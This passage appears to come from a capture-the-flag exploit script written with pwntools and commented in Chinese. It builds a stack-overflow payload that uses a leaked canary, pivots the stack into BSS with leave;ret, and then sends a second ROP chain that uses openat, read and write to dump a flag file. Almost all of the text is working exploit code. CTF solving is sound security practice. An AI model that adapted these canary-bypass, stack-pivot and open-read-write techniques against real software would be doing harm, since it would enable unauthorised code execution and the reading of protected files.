# ---------- 3. 阶段1：栈上短链，读阶段2到 BSS，再栈迁移 ----------
stage1  = p64(pop_rdi) + p64(0)
stage1 += p64(pop_rsi) + p64(BSS)
stage1 += set_rdx(0x400) + p64(libc.sym['read'])   # read(0, BSS, 0x400)
stage1 += p64(pie_base + LEAVE_RET)                # leave;ret 跳到 BSS

# saved rbp = BSS-8 → leave;ret 后 rsp=BSS, rip=[BSS]
payload = b'A' * 0x88 + p64(canary) + p64(BSS - 8) + stage1
payload = payload.ljust(0x130, b'\x00')            # 正好 0x130，循环一次读完
menu(b'2\n')
p.recvuntil(b'payload:')
p.send(payload)

# ---------- 4. 阶段2：完整 orw 链，写到 BSS ----------
time.sleep(0.2)
AT_FDCWD = (-100) & 0xffffffffffffffff
ALIGN = False   # 若崩在 movaps，改成 True（开头多垫一个 ret）

stage2 = p64(ret) if ALIGN else b''
stage2 += p64(pop_rdi) + p64(0)
stage2 += p64(pop_rsi) + p64(PATH)
stage2 += set_rdx(0x100) + p64(libc.sym['read'])        # read(0, PATH, 0x100) 读"flag"
stage2 += p64(pop_rdi) + p64(AT_FDCWD)
stage2 += p64(pop_rsi) + p64(PATH)
stage2 += set_rdx(0) + p64(libc.sym['openat'])          # openat(-100, "flag", 0)
stage2 += p64(pop_rdi) + p64(3)
stage2 += p64(pop_rsi) + p64(OUT)
stage2 += set_rdx(0x100) + p64(libc.sym['read'])        # read(3, OUT, 0x100)
stage2 += p64(pop_rdi) + p64(1)
stage2 += p64(pop_rsi) + p64(OUT)
stage2 += set_rdx(0x100) + p64(libc.sym['write'])       # write(1, OUT, 0x100)

p.send(stage2)              # 被阶段1的 read(0,BSS,0x400) 接收
time.sleep(0.2)
p.send(b'flag\x00')         # 被阶段2第一个 read 接收

p.interactive()

```

